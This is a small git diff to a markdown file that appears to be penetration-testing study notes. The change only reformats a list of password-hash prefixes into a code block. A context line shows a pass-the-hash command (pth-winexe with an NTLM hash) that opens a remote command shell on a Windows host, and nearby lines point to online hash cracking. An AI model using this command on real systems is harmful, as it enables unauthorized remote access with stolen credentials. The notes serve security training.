@@ -51,12 +51,13 @@ During our assessment, we discovered a local administrative account that is enab
 pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
 ```
 ### Cryptography
-> $1$: MD5-based crypt ('md5crypt')  
-> $2$: Blowfish-based crypt ('bcrypt')[^bcrypt]  
-> $sha1$: SHA-1-based crypt ('sha1crypt')  
-> $5$: SHA-256-based crypt ('sha256crypt')  
-> $6$: SHA-512-based crypt ('sha512crypt')  
-
+```
+$1$: MD5-based crypt ('md5crypt')  
+$2$: Blowfish-based crypt ('bcrypt')[^bcrypt]  
+$sha1$: SHA-1-based crypt ('sha1crypt')  
+$5$: SHA-256-based crypt ('sha256crypt')  
+$6$: SHA-512-based crypt ('sha512crypt')  
+```
 md5sum plain-text, sha1sum plain-text, sha256sum plain-text, sha512sum plain-text  
 > https://crackstation.net/ (unsalted hash crack)  
 ###### Generate salted hash
